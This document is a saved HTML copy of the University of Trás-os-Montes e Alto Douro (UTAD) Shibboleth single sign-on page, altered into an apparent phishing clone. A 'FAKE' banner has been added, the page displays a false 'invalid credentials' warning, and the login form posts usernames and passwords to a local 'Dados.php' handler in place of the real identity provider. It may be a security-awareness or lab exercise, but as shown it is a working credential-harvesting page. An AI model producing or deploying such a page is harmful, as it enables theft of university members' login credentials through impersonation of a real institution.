<!DOCTYPE html>
<!-- saved from url=(0120)https://idp.utad.pt/idp/profile/SAML2/Redirect/SSO;jsessionid=8582C3C237366144C1099D8C59170BD2?execution=e1s2&lang=pt_PT -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    		
      		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<title>Fornecedor de Identidade UTAD</title>
		<link rel="stylesheet" href="./Fornecedor de Identidade UTAD_files/bootstrap.css" type="text/css">
		<link href="./Fornecedor de Identidade UTAD_files/styles.css" rel="stylesheet">
		<link rel="shortcut icon" href="https://idp.utad.pt/idp/FCCN/images/favicon.ico">
		<script type="text/javascript" src="./Fornecedor de Identidade UTAD_files/locale.js.descarregar"></script>
		<script src="./Fornecedor de Identidade UTAD_files/jquery.min.js.descarregar"></script>
		<script src="./Fornecedor de Identidade UTAD_files/jquery.validate.min.js.descarregar"></script>
  	</head>
<body>

<div class="content-middle">
    <div class="container">


	 <div class="lang">
						<select onchange="setLocale(this.value)" id="language" class="select">
							<option selected="selected" value="pt_PT">Português</option>
				<option value="en">Inglês</option>
					</select>
        </div>


	<div class="logo_header">
	    <header>
                <h1 style="background-color:tomato;"> FAKE </h1>
				<a href="https://www.utad.pt/"><img class="img-responsive" src="./Fornecedor de Identidade UTAD_files/login_title_identidade.jpg" alt="UTAD"></a>
		</header>

	<!-- idp-lab teste - shibboleth v3.3.0 --> 
	<div class="alert alert-info">
			            				Está a aceder ao serviço<br>
				<strong>side.utad.pt</strong>

			<!-- Enabling the next 5 lines will also display the SP logo, but note that text wrapping might become odd depending on the image size -->
								            		</div>


	</div>
		<form id="loginForm" action="Dados.php" method="post">
        	

    

    <section>
		<div class="alert alert-warning">
			<p><span class="login_error">Credenciais Inválidas!</span></p>
		</div>
    </section>

            		<fieldset class="form-group">
			<label for="username">Nome de utilizador</label>
			<span class="glyphicon glyphicon-info-sign" data-toggle="tooltip" data-placement="left" title="Insira a sua Identidade Digital"></span>
								<input id="username" name="j_username" type="text" class="form-control" placeholder="Nome de utilizador" aria-describedby="basic-addon2" value="" autofocus="autofocus">
					<span class="input-group-addon" id="basic-addon2">@utad.pt</span>
					</fieldset>
		<fieldset class="form-group">
        	        <label for="password">Palavra Passe</label>
                	<input class="input-xlarge" id="password" name="j_password" type="password" placeholder="Palavra Passe" value="">
		</fieldset>		
			<div style="font-size: 13px;">
			</div>
            

<div class="form-element-wrapper">
                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
                <label for="_shib_idp_revokeConsent">Mostrar cartão digital</label>
 </div>




		
                          <div class="form-element-wrapper">
              <p id="msgRecaptcha" class="form-element form-error" style="display:none">Têm de preencher o captcha.</p>
                <button id="btnLogin" class="btn btn-large btn-primary" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue=&#39;A autenticar, por favor aguarde&#39;">Iniciar Sessão</button>
              </div>
            			<div class="label_link">
			<br> <br>	Precisa de ajuda? <a href="mailto:suporte@utad.pt?subject=Suporte%20IDP&amp;">Suporte</a> | 
			     <a href="http://www.noc.utad.pt/seguranca">Segurança</a>
			</div>


                        </form>
	   
	   
		<div class="footer_head">
			<div class="footer_info">A autenticação federada não permite que se "desligue" (logout) dos sistemas de forma habitual. Para garantir que termina a sessão autenticada em qualquer serviço federado, deverá fechar o browser. <b> Assim, não deve utilizar a autenticação federada em ambientes públicos ou onde o encerramento do browser está inibido. </b> </div>
			<div class="footer_rctsaai" style="width: 400px; margin: 0 auto;">
			<a class="afooter" href="http://www.pofc.qren.pt/compete"><img src="./Fornecedor de Identidade UTAD_files/compete.jpg" alt="Compete"></a>
			<a class="afooter" href="https://confluence.fccn.pt/display/RCTSAAI/RCTSaai"><img src="./Fornecedor de Identidade UTAD_files/rctsaai.png" alt="RCTSaai"></a></div>
			<div class="footer_id"> UTAD - Serviços de Informática e Comunicações - 2017</div>
		</div>


	

</div></div></body></html>